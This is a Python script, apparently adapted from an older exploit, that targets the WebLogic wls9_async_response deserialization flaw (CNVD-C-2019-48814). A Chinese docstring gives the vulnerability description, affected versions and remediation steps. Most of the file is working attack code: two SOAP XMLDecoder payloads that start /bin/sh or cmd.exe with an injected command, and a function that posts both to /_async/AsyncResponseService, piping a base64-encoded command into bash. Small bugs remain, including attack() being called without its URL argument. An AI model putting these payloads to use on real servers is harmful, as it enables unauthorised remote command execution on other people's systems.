# -*- coding: utf-8 -*-
import optparse
import requests
import base64

'''
Usage:
moon.py -u  weblogic http://127.0.0.1:7001
这个脚本原始出处不知道哪位大神（py2），自己改了改（py3）。base64有个坑. bytes 和 str 转换python2和3有点区别。
本脚本可直接执行命令。

CNVD-C-2019-48814

漏洞描述：
WebLogic中默认包含的wls9_async_response包，为WebLogic Server提供异步通讯服务。由于该WAR包在反序列化处理输入信息时存在缺陷，攻击者可以发送精心构造的恶意 HTTP 请求，获得目标服务器的权限，在未授权的情况下远程执行命令。

影响范围：
WebLogic 10.X
WebLogic 12.1.3

http://192.168.1.126:7001/_async
403存在，404不存在

http://192.168.1.126:7001/_async/AsyncResponseService
200存在，404不存在

修复：
打补丁
 1、删除该wls9_async_response.war包并重启webLogic：
该war包具体路径如下：
WebLogic 10.3.*：
Middleware/wlserver_10.3/server/lib/bea_wls9_async_response.war
WebLogic 12.1.3：
Middleware/Oracle_Home/oracle_common/modules/com.oracle.webservices.wls.bea-wls9-async-response_12.1.3.war
2、 通过访问策略控制禁止 /_async/* 路径的URL访问。

# 参考：
ttps://www.jianshu.com/p/c4982a845f55?utm_campaign=hugo&utm_medium=reader_share&utm_content=note&utm_source=weixin-timeline&from=timeline
https://mp.weixin.qq.com/s/xJAP11xxGpR9CCVJ-SHeLw
https://mp.weixin.qq.com/s?__biz=MzA4MDk3NzQ2OA==&mid=2454386939&idx=1&sn=2201c2986bba691c97833703ab38ee6a&chksm=882253a8bf55dabe9287d189b6eab43835fb5e11d573409818bd53c03449695da1299cdaaa7f&scene=0&xtrack=1&key=2b014a6820a1af4646355cdad083dd430a0a72940aaabd4c5d122740e2e70fe4311cf3b26341a5c67db5680b48dbb2cc9929bb2c752762eefc55cbbe9dce6687e4ab70f7680a5d816dfca875600660b6&ascene=1&uin=ODcyMzk1NTA2&devicetype=Windows+10&version=62060739&lang=zh_CN&pass_ticket=3hixJwwmL0fh6mFu2UWxBuGjTXpTeFPr%2F%2FQhP2o2XMuWI9I%2BWoiRKbL5OwDvGfou
https://mp.weixin.qq.com/s?__biz=MzUyNTk1NDQ3Ng==&mid=2247484258&idx=1&sn=f2213aec957aeb577c2d8f25bca2edd6&chksm=fa177fa1cd60f6b7634c1502b81a03c081827e9c3edb6151d75119433eafa91b080ce5549bf5&scene=0&xtrack=1&key=58a327fab9b03b4d45c412094df8e30eb0c8121282d89468600594c7b8c0bac551026570f083017558e66e639c43d0bad25d83481ed6e3122cf8f32c49b070a883b6f41e8b7f52597921748516633fe3&ascene=1&uin=ODcyMzk1NTA2&devicetype=Windows+10&version=62060739&lang=zh_CN&pass_ticket=3hixJwwmL0fh6mFu2UWxBuGjTXpTeFPr%2F%2FQhP2o2XMuWI9I%2BWoiRKbL5OwDvGfou

'''

headers = {'Content-type': 'text/xml'}
uri = '/wls-wsat/CoordinatorPortType'
linux_poc = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">  
<soapenv:Header> 
<wsa:Action>demoAction</wsa:Action>
<wsa:RelatesTo>hello</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
<java version="1.8" class="java.beans.XMLDecoder"> 
<void class="java.lang.ProcessBuilder"> 
<array class="java.lang.String" length="3"> 
<void index="0"> 
<string>/bin/sh</string> 
</void>
<void index="1"> 
<string>-c</string> 
</void>
<void index="2"> 
<string>%s</string> 
</void>
</array>  
<void method="start"/>
</void> 
</java> 
</work:WorkContext> 
</soapenv:Header>  
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body> 
</soapenv:Envelope>
'''
win_poc = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">  
<soapenv:Header> 
<wsa:Action>demoAction</wsa:Action>
<wsa:RelatesTo>hello</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
<java version="1.8" class="java.beans.XMLDecoder"> 
<void class="java.lang.ProcessBuilder"> 
<array class="java.lang.String" length="3"> 
<void index="0"> 
<string>cmd</string> 
</void>
<void index="1"> 
<string>/c</string> 
</void>
<void index="2"> 
<string>%s</string> 
</void>
</array>  
<void method="start"/>
</void> 
</java> 
</work:WorkContext> 
</soapenv:Header>  
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body> 
</soapenv:Envelope>
'''


def attack(URL):
    print('[*]开始检测-Weblogic-CNVD-C-2019-48814。[*]')
    cmd = str('whoami')
    base64cmd=base64.b64encode(cmd.encode('utf-8'))
    linux_poccmd = 'echo %s|base64 -d|bash' % base64cmd.decode('utf-8')
    linux_poc2 = linux_poc % linux_poccmd
    win_poc2 = win_poc % cmd
    url2 = URL + '/_async/AsyncResponseService'
    try:
        r1 = requests.post(url2,headers=headers,data=linux_poc2,timeout=7)
        r2 = requests.post(url2,headers=headers,data=win_poc2,timeout=7)
        if r1.status_code == 202 or r2.status_code == 202:
            print('[+]发现 CNVD-C-2019-48814!  请使用exp确认。')
            print('[*]检测结束-Weblogic-CNVD-C-2019-48814。[*]')
            print('\n')
        else:
            print('[-]未发现 CNVD-C-2019-48814!')
            print('[*]检测结束-Weblogic-CNVD-C-2019-48814。[*]')
            print('\n')
    except requests.ReadTimeout:
        print('[-]未发现 CNVD-C-2019-48814!   Read timeout')
        print('[*]检测结束-Weblogic-CNVD-C-2019-48814。[*]')
        print('\n')
    except Exception:
        print('[-]未发现 CNVD-C-2019-48814!   some error')
        print('[*]检测结束-Weblogic-CNVD-C-2019-48814。[*]')
        print('\n')

if __name__ == '__main__':
    attack()